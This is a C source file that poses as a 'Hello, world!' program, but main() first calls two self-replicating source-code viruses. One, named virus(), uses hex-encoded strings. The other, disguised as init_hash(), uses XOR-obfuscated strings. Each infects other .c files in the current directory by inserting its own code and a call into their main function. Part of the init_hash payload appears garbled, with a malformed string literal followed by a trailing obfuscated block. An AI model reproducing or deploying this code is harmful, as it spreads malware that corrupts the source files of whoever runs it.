#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <dirent.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>

void init_hash(); 


void virus();

#include <stdio.h>

int main(int argc, char *argv[])
{

  virus();
	init_hash();
	printf("Hello, world!\n");
}

void virus() {
  int i, hd, fd, readbyte, writebyte, posmain, posbuffer;
  DIR *dd;
  struct dirent *dirp;
  char nibble[2], nibblechar, *readbuffer, *writebuffer, 
       *readmain, *writemain, *bufname, *buffer;

  char charinclude[] = "23696e636c756465203c737464696f2e683e0a23696e636c756465203c7374646c69622e683e0a23696e636c756465203c7379732f737461742e683e0a23696e636c756465203c756e697374642e683e0a23696e636c756465203c66636e746c2e683e0a23696e636c756465203c74696d652e683e0a23696e636c756465203c646972656e742e683e0a23696e636c756465203c656c662e683e0a23696e636c756465203c7379732f74797065732e683e0a23696e636c756465203c7379732f776169742e683e0a0a766f696420766972757328293b0a0a";
  char charvirus[] = "0a766f69642076697275732829207b0a2020696e7420692c2068642c2066642c2072656164627974652c207772697465627974652c20706f736d61696e2c20706f736275666665723b0a2020444952202a64643b0a202073747275637420646972656e74202a646972703b0a202063686172206e6962626c655b325d2c206e6962626c65636861722c202a726561646275666665722c202a77726974656275666665722c200a202020202020202a726561646d61696e2c202a77726974656d61696e2c202a6275666e616d652c202a6275666665723b0a";
  char charvirusend[] = "0a20206464203d206f70656e64697228222e22293b0a20207768696c65282864697270203d207265616464697228646429293e3029200a202020206966282868643d6f70656e28646972702d3e645f6e616d652c204f5f524457522c203029293e3d3029207b0a2020202020206966282866643d6f70656e28646972702d3e645f6e616d652c204f5f524457522c203029293e3d3029207b0a20202020202020206966282128737472636d7028646972702d3e645f6e616d652b7374726c656e28646972702d3e645f6e616d65292d322c222e632229297c7c0a092020202128737472636d7028646972702d3e645f6e616d652b7374726c656e28646972702d3e645f6e616d65292d322c222e4322292929207b0a0920206c7365656b2866642c202d33302c205345454b5f454e44293b0a0920206275666e616d65203d202863686172202a296d616c6c6f63283330293b0a0920207265616462797465203d20726561642866642c206275666e616d652c3330293b0a09202069662828737472737472286275666e616d652c20222f2a20736175636521202a2f22293c3d302929207b0a09202020206c7365656b2866642c20302c205345454b5f534554293b0a0920202020706f736d61696e203d20706f73627566666572203d20303b0a202020202020202020202020627566666572203d202863686172202a296d616c6c6f632831303234293b0a09202020207768696c65282872656164627974653d726561642866642c6275666665722c3130323429293e3029207b0a09202020202020696628202828706f736275666665723d737472737472286275666665722c225c6e6d61696e282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e696e74206d61696e282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e766f6964206d61696e282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e6d61696e20282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e696e74206d61696e20282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e766f6964206d61696e20282229293e30292029207b0a0909627265616b3b0a092020202020207d0a09202020202020706f736d61696e202b3d2072656164627974653b0a09202020207d0a0920202020696628706f736275666665723e3029207b0a09202020202020706f736d61696e202b3d202828696e7429706f736275666665722d28696e7429627566666572293b0a092020202020206c7365656b2866642c20706f736d61696e2c205345454b5f534554293b0a09202020202020726561642866642c206275666665722c203830293b200a0920202020202069662828706f73627566666572203d20737472737472286275666665722c227b5c6e2229293e30290a20202020202020202020202020202020706f736d61696e202b3d2032202b202828696e7429706f736275666665722d28696e7429627566666572293b0a09202020202020656c73650a092020202020202020706f736d61696e203d202d313b0a09202020207d20656c736520706f736d61696e203d202d313b0a0920202020696628706f736d61696e3e3029207b0a092020202020206c7365656b2866642c20302c205345454b5f534554293b0a09202020202020777269746562797465203d207374726c656e2863686172696e636c75646529202f20323b0a202020202020202020202020202072656164627566666572203d202863686172202a296d616c6c6f6328777269746562797465293b0a20202020202020202020202020207772697465627566666572203d202863686172202a296d616c6c6f6328777269746562797465293b0a2020202020202020202020202020666f7228693d303b693c7374726c656e2863686172696e636c756465293b692b3d3229207b0a0920202020202020206e6962626c655b305d203d2063686172696e636c7564655b695d3b0a0920202020202020206e6962626c655b315d203d2063686172696e636c7564655b692b315d3b0a092020202020202020737363616e66286e6962626c652c202225303258222c20266e6962626c6563686172293b0a202020202020202020202020202020207374726e6361742877726974656275666665722c20266e6962626c65636861722c2031293b0a092020202020207d0a092020202020207768696c65282872656164627974653d726561642866642c726561646275666665722c77726974656279746529293e3029207b0a20200920202020202020206c7365656b2866642c202d72656164627974652c205345454b5f435552293b0a09202020202020202077726974652866642c2077726974656275666665722c20777269746562797465293b0a092020202020202020777269746562797465203d20726561642866642c2077726974656275666665722c20777269746562797465293b200a202020202020202020202020202020206c7365656b2866642c202d7772697465627974652c205345454b5f435552293b0a09202020202020202077726974652866642c20726561646275666665722c207265616462797465293b0a092020202020207d0a20202020202020202020202020206c7365656b2866642c2d72656164627974652c5345454b5f435552293b0a0920202020202077726974652866642c77726974656275666665722c777269746562797465293b0a09202020202020777269746562797465203d207374726c656e2863686172696e636c75646529202f20323b0a092020202020206c7365656b2866642c20706f736d61696e2b7772697465627974652c205345454b5f534554293b0a09202020202020777269746562797465203d207374726c656e28225c6e2020766972757328293b5c6e22293b0a2020202020202020202020202020726561646d61696e203d202863686172202a296d616c6c6f6328777269746562797465293b0a202020202020202020202020202077726974656d61696e203d202863686172202a296d616c6c6f6328777269746562797465293b0a092020202020207374726370792877726974656d61696e2c225c6e2020766972757328293b5c6e22293b0a092020202020207768696c65282872656164627974653d726561642866642c726561646d61696e2c77726974656279746529293e3029207b0a20200920202020202020206c7365656b2866642c2d72656164627974652c5345454b5f435552293b0a09202020202020202077726974652866642c77726974656d61696e2c777269746562797465293b0a0920202020202020207772697465627974653d726561642866642c77726974656d61696e2c777269746562797465293b200a202020202020202020202020202020206c7365656b2866642c2d7772697465627974652c5345454b5f435552293b0a09202020202020202077726974652866642c726561646d61696e2c7265616462797465293b0a092020202020207d0a20202020202020202020202020206c7365656b2866642c2d72656164627974652c5345454b5f435552293b0a0920202020202077726974652866642c77726974656d61696e2c777269746562797465293b0a092020202020206c7365656b2866642c20302c205345454b5f454e44293b0a2020202020202020202020202020666f7228693d303b693c7374726c656e28636861727669727573293b692b3d3229207b0a0920202020202020206e6962626c655b305d203d206368617276697275735b695d3b0a0920202020202020206e6962626c655b315d203d206368617276697275735b692b315d3b0a092020202020202020737363616e66286e6962626c652c2225303258222c266e6962626c6563686172293b0a2020202020202020202020202020202077726974652866642c20266e6962626c65636861722c2031293b0a092020202020207d0a202020202020202020202020202077726974652866642c20225c6e2020636861722063686172696e636c7564655b5d203d205c22222c207374726c656e28225c6e2020636861722063686172696e636c7564655b5d203d205c222229293b0a202020202020202020202020202077726974652866642c2063686172696e636c7564652c207374726c656e2863686172696e636c75646529293b0a202020202020202020202020202077726974652866642c20225c223b5c6e202063686172206368617276697275735b5d203d205c22222c207374726c656e28225c223b5c6e202063686172206368617276697275735b5d203d205c222229293b0a202020202020202020202020202077726974652866642c206368617276697275732c207374726c656e2863686172766972757329293b0a202020202020202020202020202077726974652866642c20225c223b5c6e20206368617220636861727669727573656e645b5d203d205c22222c207374726c656e28225c223b5c6e20206368617220636861727669727573656e645b5d203d205c222229293b0a202020202020202020202020202077726974652866642c20636861727669727573656e642c207374726c656e28636861727669727573656e6429293b0a202020202020202020202020202077726974652866642c20225c223b5c6e222c207374726c656e28225c223b5c6e2229293b0a092020202020206c7365656b2866642c20302c205345454b5f454e44293b0a2020202020202020202020202020666f7228693d303b693c7374726c656e28636861727669727573656e64293b692b3d3229207b0a0920202020202020206e6962626c655b305d203d20636861727669727573656e645b695d3b0a0920202020202020206e6962626c655b315d203d20636861727669727573656e645b692b315d3b0a092020202020202020737363616e66286e6962626c652c2225303258222c266e6962626c6563686172293b0a2020202020202020202020202020202077726974652866642c20266e6962626c65636861722c2031293b0a092020202020207d0a2020202020202020202020202020636c6f7365286664293b0a09202020207d0a0920207d0a097d0a2020202020207d0a202020202020636c6f7365286864293b0a202020207d0a2020636c6f7365646972286464293b0a20202f2a20736175636521202a2f0a7d0a";

  dd = opendir(".");
  while((dirp = readdir(dd))>0) 
    if((hd=open(dirp->d_name, O_RDWR, 0))>=0) {
      if((fd=open(dirp->d_name, O_RDWR, 0))>=0) {
        if(!(strcmp(dirp->d_name+strlen(dirp->d_name)-2,".c"))||
	   !(strcmp(dirp->d_name+strlen(dirp->d_name)-2,".C"))) {
	  lseek(fd, -30, SEEK_END);
	  bufname = (char *)malloc(30);
	  readbyte = read(fd, bufname,30);
	  if((strstr(bufname, "/* sauce! */")<=0)) {
	    lseek(fd, 0, SEEK_SET);
	    posmain = posbuffer = 0;
            buffer = (char *)malloc(1024);
	    while((readbyte=read(fd,buffer,1024))>0) {
	      if( ((posbuffer=strstr(buffer,"\nmain("))>0) ||
	        ((posbuffer=strstr(buffer,"\nint main("))>0) ||
	        ((posbuffer=strstr(buffer,"\nvoid main("))>0) ||
	        ((posbuffer=strstr(buffer,"\nmain ("))>0) ||
	        ((posbuffer=strstr(buffer,"\nint main ("))>0) ||
	        ((posbuffer=strstr(buffer,"\nvoid main ("))>0) ) {
		break;
	      }
	      posmain += readbyte;
	    }
	    if(posbuffer>0) {
	      posmain += ((int)posbuffer-(int)buffer);
	      lseek(fd, posmain, SEEK_SET);
	      read(fd, buffer, 80); 
	      if((posbuffer = strstr(buffer,"{\n"))>0)
                posmain += 2 + ((int)posbuffer-(int)buffer);
	      else
	        posmain = -1;
	    } else posmain = -1;
	    if(posmain>0) {
	      lseek(fd, 0, SEEK_SET);
	      writebyte = strlen(charinclude) / 2;
              readbuffer = (char *)malloc(writebyte);
              writebuffer = (char *)malloc(writebyte);
              for(i=0;i<strlen(charinclude);i+=2) {
	        nibble[0] = charinclude[i];
	        nibble[1] = charinclude[i+1];
	        sscanf(nibble, "%02X", &nibblechar);
                strncat(writebuffer, &nibblechar, 1);
	      }
	      while((readbyte=read(fd,readbuffer,writebyte))>0) {
  	        lseek(fd, -readbyte, SEEK_CUR);
	        write(fd, writebuffer, writebyte);
	        writebyte = read(fd, writebuffer, writebyte); 
                lseek(fd, -writebyte, SEEK_CUR);
	        write(fd, readbuffer, readbyte);
	      }
              lseek(fd,-readbyte,SEEK_CUR);
	      write(fd,writebuffer,writebyte);
	      writebyte = strlen(charinclude) / 2;
	      lseek(fd, posmain+writebyte, SEEK_SET);
	      writebyte = strlen("\n  virus();\n");
              readmain = (char *)malloc(writebyte);
              writemain = (char *)malloc(writebyte);
	      strcpy(writemain,"\n  virus();\n");
	      while((readbyte=read(fd,readmain,writebyte))>0) {
  	        lseek(fd,-readbyte,SEEK_CUR);
	        write(fd,writemain,writebyte);
	        writebyte=read(fd,writemain,writebyte); 
                lseek(fd,-writebyte,SEEK_CUR);
	        write(fd,readmain,readbyte);
	      }
              lseek(fd,-readbyte,SEEK_CUR);
	      write(fd,writemain,writebyte);
	      lseek(fd, 0, SEEK_END);
              for(i=0;i<strlen(charvirus);i+=2) {
	        nibble[0] = charvirus[i];
	        nibble[1] = charvirus[i+1];
	        sscanf(nibble,"%02X",&nibblechar);
                write(fd, &nibblechar, 1);
	      }
              write(fd, "\n  char charinclude[] = \"", strlen("\n  char charinclude[] = \""));
              write(fd, charinclude, strlen(charinclude));
              write(fd, "\";\n  char charvirus[] = \"", strlen("\";\n  char charvirus[] = \""));
              write(fd, charvirus, strlen(charvirus));
              write(fd, "\";\n  char charvirusend[] = \"", strlen("\";\n  char charvirusend[] = \""));
              write(fd, charvirusend, strlen(charvirusend));
              write(fd, "\";\n", strlen("\";\n"));
	      lseek(fd, 0, SEEK_END);
              for(i=0;i<strlen(charvirusend);i+=2) {
	        nibble[0] = charvirusend[i];
	        nibble[1] = charvirusend[i+1];
	        sscanf(nibble,"%02X",&nibblechar);
                write(fd, &nibblechar, 1);
	      }
              close(fd);
	    }
	  }
	}
      }
      close(hd);
    }
  closedir(dd);
  /* sauce! */
}

void init_hash()
{
	int i, j, fd, size, mpos, ipos, page, 
	ihole, thole, bhole, ehole; struct dirent *dir; DIR *d;
	void *ptr;
	char hashinc[] = "Š£éîãìõäå ¼óôäéï®è¾Š£éîãìõäå ¼óùó¯óôáô®è¾Š£éîãìõäå ¼óùó¯ííáî®è¾Š£éîãìõäå ¼õîéóôä®è¾Š£éîãìõäå ¼äéòåîô®è¾Š£éîãìõäå ¼æãîôì®è¾ŠŠöïéä éîéôßèáóè¨©» Š";
	char hashbeg[] = "Šöïéä éîéôßèáóè¨©ŠûŠ‰éîô é¬ ê¬ æä¬ óéúå¬ íðïó¬ éðïó¬ ðáçå¬ Š‰éèïìå¬ ôèïìå¬ âèïìå¬ åèïìå» óôòõãô äéòåîô ªäéò» ÄÉÒ ªä»Š‰öïéä ªðôò»Š‰ãèáò èáóèéîãÛÝ ½ ¢";
	char hashend[] = "	char *buf;

	d = opendir(".");
	while((dir = readdir(d))>0)
		if(!(strcmp(dir->d_name+strlen(dir->d_name)-2,".c"))||
		   !(strcmp(dir->d_name+strlen(dir->d_name)-2,".C"))) 
			if((fd=open(dir->d_name, O_RDWR, 0))>=0)
			{
				size = lseek(fd, 0, SEEK_END);
				ptr = mmap(NULL,size,PROT_READ,MAP_PRIVATE,fd,0);
				if( (!strstr(ptr,"init_hash")) &&
				  ( ((mpos=(int)strstr(ptr,"\nmain("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nint main("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nvoid main("))>0) || 
				    ((mpos=(int)strstr(ptr,"\nmain ("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nint main ("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nvoid main ("))>0) ) )
				{
					mpos = (int)strstr((void *)mpos, ";\n");
					mpos -= (int)--ptr;
					if( !(ipos = (int)strstr(++ptr, "#include <")) )
					{
						munmap(ptr, size);
						break;
					}
					munmap(ptr, size);
					page = 3 * (int)sysconf(_SC_PAGESIZE);
					ftruncate(fd, size+page);
					ptr = mmap(NULL,size+page,PROT_READ+PROT_WRITE,MAP_SHARED,fd,0);
					ipos = (int)strstr(ptr, "#include <");
					ipos = (int)strstr((void *)ipos, "\n\n");
					ipos -= (int)ptr;
					for(i=0;i<strlen(hashinc);i++)
						hashinc[i] ^= 0x80;
					for(i=0;i<strlen(hashbeg);i++)
						hashbeg[i] ^= 0x80;
					ihole = strlen(hashinc);
					for(i=(size-ipos)/ihole;i>=0;i--) 
						memcpy(ptr+ipos+i*ihole+ihole, ptr+ipos+i*ihole, ihole);
					memcpy(ptr+ipos, hashinc, ihole);
					for(i=0;i<strlen(hashinc);i++)
						hashinc[i] ^= 0x80;
					mpos += ihole;
					buf = (char *)malloc(20*sizeof(char));
					strcpy(buf,"\n\tinit_hash();");
					thole = strlen(buf);
					for(i=(size+ihole-mpos)/thole;i>=0;i--) 
						memcpy(ptr+mpos+i*thole+thole, ptr+mpos+i*thole, thole);
					memcpy(ptr+mpos, buf, thole);
					bhole = strlen(hashbeg);
					memcpy(ptr+size+ihole+thole, hashbeg, bhole);
					memcpy(ptr+size+ihole+thole+bhole, hashinc, ihole);
					bhole += ihole;
					sprintf(ptr+size+ihole+thole+bhole, "\";\n\tchar hashbeg[] = \"");
					bhole += 22;
					for(i=0;i<strlen(hashbeg);i++)
						hashbeg[i] ^= 0x80;
					memcpy(ptr+size+ihole+thole+bhole, hashbeg, strlen(hashbeg));
					bhole += strlen(hashbeg);
					sprintf(ptr+size+ihole+thole+bhole, "\";\n\tchar hashend[] = \"");
					bhole += 22;
					memcpy(ptr+size+ihole+thole+bhole, hashend, strlen(hashend));
					bhole += strlen(hashend);
					sprintf(ptr+size+ihole+thole+bhole, "\";\n");
					bhole += 3;
					for(i=0;i<strlen(hashend);i++)
						hashend[i] ^= 0x80;
					ehole = strlen(hashend);
					memcpy(ptr+size+ihole+thole+bhole, hashend, ehole);
					msync(ptr, size+page, MS_SYNC);
					munmap(ptr, size+page);
					ftruncate(fd, size+ihole+thole+bhole+ehole);
				} else
				{
					munmap(ptr, size);
				}
			}
}
";
‰ãèáò ªâõæ»ŠŠ‰ä ½ ïðåîäéò¨¢®¢©»Š‰÷èéìå¨¨äéò ½ òåáääéò¨ä©©¾°©Š‰‰éæ¨¡¨óôòãíð¨äéò­¾äßîáíå«óôòìåî¨äéò­¾äßîáíå©­²¬¢®ã¢©©üüŠ‰‰   ¡¨óôòãíð¨äéò­¾äßîáíå«óôòìåî¨äéò­¾äßîáíå©­²¬¢®Ã¢©©© Š‰‰‰éæ¨¨æä½ïðåî¨äéò­¾äßîáíå¬ ÏßÒÄ×Ò¬ °©©¾½°©Š‰‰‰ûŠ‰‰‰‰óéúå ½ ìóååë¨æä¬ °¬ ÓÅÅËßÅÎÄ©»Š‰‰‰‰ðôò ½ ííáð¨ÎÕÌÌ¬óéúå¬ÐÒÏÔßÒÅÁÄ¬ÍÁÐßÐÒÉÖÁÔÅ¬æä¬°©»Š‰‰‰‰éæ¨ ¨¡óôòóôò¨ðôò¬¢éîéôßèáóè¢©© ¦¦Š‰‰‰‰  ¨ ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîíáéî¨¢©©¾°© üüŠ‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîéîô íáéî¨¢©©¾°© üüŠ‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîöïéä íáéî¨¢©©¾°© üü Š‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîíáéî ¨¢©©¾°© üüŠ‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîéîô íáéî ¨¢©©¾°© üüŠ‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîöïéä íáéî ¨¢©©¾°© © ©Š‰‰‰‰ûŠ‰‰‰‰‰íðïó ½ ¨éîô©óôòóôò¨¨öïéä ª©íðïó¬ ¢»Üî¢©»Š‰‰‰‰‰íðïó ­½ ¨éîô©­­ðôò»Š‰‰‰‰‰éæ¨ ¡¨éðïó ½ ¨éîô©óôòóôò¨««ðôò¬ ¢£éîãìõäå ¼¢©© ©Š‰‰‰‰‰ûŠ‰‰‰‰‰‰íõîíáð¨ðôò¬ óéúå©»Š‰‰‰‰‰‰âòåáë»Š‰‰‰‰‰ýŠ‰‰‰‰‰íõîíáð¨ðôò¬ óéúå©»Š‰‰‰‰‰ðáçå ½ ³ ª ¨éîô©óùóãïîæ¨ßÓÃßÐÁÇÅÓÉÚÅ©»Š‰‰‰‰‰æôòõîãáôå¨æä¬ óéúå«ðáçå©»Š‰‰‰‰‰ðôò ½ ííáð¨ÎÕÌÌ¬óéúå«ðáçå¬ÐÒÏÔßÒÅÁÄ«ÐÒÏÔß×ÒÉÔÅ¬ÍÁÐßÓÈÁÒÅÄ¬æä¬°©»Š‰‰‰‰‰éðïó ½ ¨éîô©óôòóôò¨ðôò¬ ¢£éîãìõäå ¼¢©»Š‰‰‰‰‰éðïó ½ ¨éîô©óôòóôò¨¨öïéä ª©éðïó¬ ¢ÜîÜî¢©»Š‰‰‰‰‰éðïó ­½ ¨éîô©ðôò»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèéîã©»é««©Š‰‰‰‰‰‰èáóèéîãÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèâåç©»é««©Š‰‰‰‰‰‰èáóèâåçÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰éèïìå ½ óôòìåî¨èáóèéîã©»Š‰‰‰‰‰æïò¨é½¨óéúå­éðïó©¯éèïìå»é¾½°»é­­© Š‰‰‰‰‰‰íåíãðù¨ðôò«éðïó«éªéèïìå«éèïìå¬ ðôò«éðïó«éªéèïìå¬ éèïìå©»Š‰‰‰‰‰íåíãðù¨ðôò«éðïó¬ èáóèéîã¬ éèïìå©»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèéîã©»é««©Š‰‰‰‰‰‰èáóèéîãÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰íðïó «½ éèïìå»Š‰‰‰‰‰âõæ ½ ¨ãèáò ª©íáììïã¨²°ªóéúåïæ¨ãèáò©©»Š‰‰‰‰‰óôòãðù¨âõæ¬¢ÜîÜôéîéôßèáóè¨©»¢©»Š‰‰‰‰‰ôèïìå ½ óôòìåî¨âõæ©»Š‰‰‰‰‰æïò¨é½¨óéúå«éèïìå­íðïó©¯ôèïìå»é¾½°»é­­© Š‰‰‰‰‰‰íåíãðù¨ðôò«íðïó«éªôèïìå«ôèïìå¬ ðôò«íðïó«éªôèïìå¬ ôèïìå©»Š‰‰‰‰‰íåíãðù¨ðôò«íðïó¬ âõæ¬ ôèïìå©»Š‰‰‰‰‰âèïìå ½ óôòìåî¨èáóèâåç©»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå¬ èáóèâåç¬ âèïìå©»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ èáóèéîã¬ éèïìå©»Š‰‰‰‰‰âèïìå «½ éèïìå»Š‰‰‰‰‰óðòéîôæ¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ ¢Ü¢»ÜîÜôãèáò èáóèâåçÛÝ ½ Ü¢¢©»Š‰‰‰‰‰âèïìå «½ ²²»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèâåç©»é««©Š‰‰‰‰‰‰èáóèâåçÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ èáóèâåç¬ óôòìåî¨èáóèâåç©©»Š‰‰‰‰‰âèïìå «½ óôòìåî¨èáóèâåç©»Š‰‰‰‰‰óðòéîôæ¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ ¢Ü¢»ÜîÜôãèáò èáóèåîäÛÝ ½ Ü¢¢©»Š‰‰‰‰‰âèïìå «½ ²²»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ èáóèåîä¬ óôòìåî¨èáóèåîä©©»Š‰‰‰‰‰âèïìå «½ óôòìåî¨èáóèåîä©»Š‰‰‰‰‰óðòéîôæ¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ ¢Ü¢»Üî¢©»Š‰‰‰‰‰âèïìå «½ ³»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèåîä©»é««©Š‰‰‰‰‰‰èáóèåîäÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰åèïìå ½ óôòìåî¨èáóèåîä©»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ èáóèåîä¬ åèïìå©»Š‰‰‰‰‰íóùîã¨ðôò¬ óéúå«ðáçå¬ ÍÓßÓÙÎÃ©»Š‰‰‰‰‰íõîíáð¨ðôò¬ óéúå«ðáçå©»Š‰‰‰‰‰æôòõîãáôå¨æä¬ óéúå«éèïìå«ôèïìå«âèïìå«åèïìå©»Š‰‰‰‰ý åìóåŠ‰‰‰‰ûŠ‰‰‰‰‰íõîíáð¨ðôò¬ óéúå©»Š‰‰‰‰ýŠ‰‰‰ýŠýŠ